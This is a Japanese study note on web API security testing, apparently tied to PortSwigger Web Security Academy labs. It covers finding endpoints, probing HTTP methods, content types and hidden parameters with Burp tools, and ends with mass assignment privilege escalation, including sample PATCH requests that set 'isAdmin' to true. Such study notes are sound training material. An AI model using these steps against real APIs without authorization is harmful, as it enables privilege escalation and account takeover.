# 注目ポイント

- Forgot password機能（Please enter your usernameなど）
- Update your email
- JSON形式のレスポンス
- `/api~` リクエスト

---

# Detection

## APIエンドポイントの発見

以下のいずれかの方法で発見する：

| 方法             | 説明                                                                                                        |
| -------------- | --------------------------------------------------------------------------------------------------------- |
| Brute-force    | `GET /` に対してAPIエンドポイント用🔗[api_wordlist - GitHub](https://github.com/chrislockard/api_wordlist)でブルートフォースする |
| HTTP history   | 一通り探索した後、HTTP historyでAPIへのリクエストを確認する（ログイン後の探索が効果的）                                                       |
| Scanner        | Passive Scanで自動的に検出される                                                                                    |
| JS Link Finder | JavaScriptファイル内のAPIエンドポイントへの参照を見つける（Extension）                                                            |

> [!TIP] エンドポイントを特定したらベースのパスも確認すること。重要な情報が得られることがある。
> 
> ```
> /api/example/v1/users/123
>   ↓ 確認する
> /api/example/v1
> /api/example
> /api
> ```


## APIエンドポイントの調査

発見したエンドポイントに対して有効なリクエストを作成するために以下を調査する。

### 利用可能なHTTPメソッドの特定

重要でないオブジェクトを扱うエンドポイントに対してIntruderをかける：

```http
§GET§ /api/v1/<重要でないオブジェクト>
```

- Payload type: Simple list → Add from list → HTTP verbs

### 利用可能なContent-Typeヘッダの特定

発見したエンドポイントに対してContent Type Convertorを使用してリクエストを送り、以下を確認する：

- Content-Typeを変更してもエラーはないか
- エラーメッセージに有用な情報が含まれないか

### 利用可能なパラメータの検出

発見したエンドポイントに対して、Param Miner → Guess GET parametersを使用する。


---

# Exploitation

## 未使用エンドポイントの悪用

調査で発見したHTTPメソッドや `Content-Type` を使用して、任意の値に変更する。

🔗[Web Security Academy Lab: Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)


## Mass Assignment によるPrivEsc

**Mass Assignmentとは：** 隠しパラメータ、または他のエンドポイントへのリクエストに使用されるパラメータを使って、攻撃者の意図する値に変更する攻撃。

### 手順

1. あるAPIエンドポイントへのリクエスト・レスポンスのパラメータを観察する
```json
{
    "username": "wiener",
    "email": "wiener@example.com"
}
```

2. 他のAPIエンドポイントへのリクエスト・レスポンスを観察し、追加のパラメータを探す
```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

3. `PATCH` または `POST` リクエストで、他のエンドポイントで使われているパラメータを試す

正常な値でエラーが出ないか確認
```http
PATCH /api/users/

{
    "username": "<username>",
    "email": "<username>@<example.com>",
    "isAdmin": false
}
```

不正な値でエラーが出るか確認（エラーが出る = パラメータを受け付けている）
```http
{
    "isAdmin": hogehoge
}
```

4. パラメータの値を改変してリクエストし、PrivEscを完了する
```http
PATCH /api/users/

{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}
```

🔗[Web Security Academy Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

